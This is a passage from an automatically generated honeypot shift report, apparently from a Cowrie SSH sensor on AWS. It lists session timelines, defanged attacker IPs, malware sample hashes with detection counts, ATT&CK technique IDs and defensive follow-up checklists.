| `2026-04-24 20:36:20` | `cowrie.session.params` |
| `2026-04-24 20:36:20` | `cowrie.command.input` |
| `2026-04-24 20:36:20` | `cowrie.command.failed` |
| `2026-04-24 20:36:20` | `cowrie.log.closed` |
| `2026-04-24 20:36:21` | `cowrie.session.params` |
| `2026-04-24 20:36:21` | `cowrie.command.input` |
| `2026-04-24 20:36:21` | `cowrie.session.file_download` |
| `2026-04-24 20:36:21` | `cowrie.log.closed` |
| `2026-04-24 20:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4abe70c13822

| Field | Detail |
|---|---|
| **Source IP** | `103.120.227[.]88` |
| **First Seen** | 2026-04-24 20:36 |
| **Last Seen** | 2026-04-24 20:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 20:36:27` | `cowrie.session.connect` |
| `2026-04-24 20:36:27` | `cowrie.client.version` |
| `2026-04-24 20:36:27` | `cowrie.client.kex` |
| `2026-04-24 20:36:28` | `cowrie.login.success` |
| `2026-04-24 20:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.227[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.120.227[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.120.227[.]88` | **27** | 2026-04-24 20:27 | 2026-04-24 20:41 | 43m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.214.109[.]147` | **25** | 2026-04-24 19:14 | 2026-04-24 19:19 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `103.173.7[.]204` | **25** | 2026-04-24 20:38 | 2026-04-24 20:43 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `20.64.105[.]6` | **2** | 2026-04-24 19:30 | 2026-04-24 19:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `211.144.146[.]93` | **2** | 2026-04-24 20:07 | 2026-04-24 20:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `79.104.0[.]82` | **2** | 2026-04-24 19:59 | 2026-04-24 20:31 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-04-24 20:44 | 2026-04-24 20:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.223.20[.]12` | 1 | 2026-04-24 19:43 | 2026-04-24 19:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.166.94[.]133` | 1 | 2026-04-24 19:51 | 2026-04-24 19:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `191.101.59[.]59` | 1 | 2026-04-24 20:29 | 2026-04-24 20:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.131.63[.]3` | 1 | 2026-04-24 20:27 | 2026-04-24 20:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `191.101.59[.]59` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 1 |
| `211.144.146[.]93` | CN | Beijing Holy Valley Information Co.Ltd | **100** ⚠️ | 13 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `103.120.227[.]88` | CN | UNICLOUD TECH CO.,LTD. | **100** ⚠️ | 50 |
| `20.64.105[.]6` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `150.223.20[.]12` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 50 |
| `103.173.7[.]204` | PK | GRACE BROADBAND | **100** ⚠️ | 13 |
| `79.104.0[.]82` | RU | 111250 Russia SOVINTEL/EDN | **100** ⚠️ | 50 |
| `34.131.63[.]3` | IN | Google LLC | **100** ⚠️ | 0 |
| `183.166.94[.]133` | CN | CHINANET Anhui province network | **100** ⚠️ | 34 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 7 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 118 cases |
| Tool 34  | Credential Extractor        | ✅ 21 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (13.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 11 recon entry/entries in table (6 group(s) consolidating 83 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-24T20:55:37Z_
